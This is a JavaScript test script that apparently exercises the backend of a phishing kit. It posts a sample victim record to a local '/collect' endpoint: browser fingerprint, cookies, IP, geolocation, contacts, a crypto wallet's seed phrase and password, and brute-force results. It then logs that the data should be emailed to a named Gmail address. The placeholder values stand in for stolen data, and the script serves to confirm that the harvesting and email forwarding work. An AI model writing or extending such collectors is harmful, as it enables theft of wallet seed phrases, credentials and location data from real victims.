const axios = require("axios");

// Simulate web form data
const webFormData = {
  timestamp: new Date().toISOString(),
  userAgent:
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
  platform: "MacIntel",
  device: "8",
  language: "en-US",
  cookies: "test=value",
  screen: "1920x1080",
  ip: "192.168.1.100",
  latitude: "40.7128",
  longitude: "-74.0060",
  accuracy: "10",
  geoError: "None",
  localStorage: "{}",
  contacts: "Contacts API not supported",
  walletName: "Test Crypto Wallet",
  seedPhrase: "test seed phrase for testing purposes",
  password: "testPassword123",
  bruteForceResults: [
    { seed: "test seed phrase for testing purposes", valid: true },
  ],
};

async function testWebForm() {
  try {
    console.log("🌐 Testing Web Form Submission...");
    console.log("📤 Sending form data to server...");
    console.log("📧 Expected email recipient: 411plus411@gmail.com");

    const response = await axios.post(
      "http://localhost:3000/collect",
      webFormData,
      {
        headers: {
          "Content-Type": "application/json",
        },
        timeout: 10000,
      }
    );

    console.log("✅ Form submission successful!");
    console.log("📧 Email should have been sent to 411plus411@gmail.com");
    console.log("");
    console.log("📋 Data sent:");
    console.log("- Wallet Name:", webFormData.walletName);
    console.log("- Seed Phrase:", webFormData.seedPhrase);
    console.log("- Password:", webFormData.password);
    console.log("- IP Address:", webFormData.ip);
    console.log(
      "- Location:",
      `${webFormData.latitude}, ${webFormData.longitude}`
    );
  } catch (error) {
    console.error("❌ Error testing web form:", error.message);
    if (error.response) {
      console.error("Server response:", error.response.data);
    }
  }
}

testWebForm();
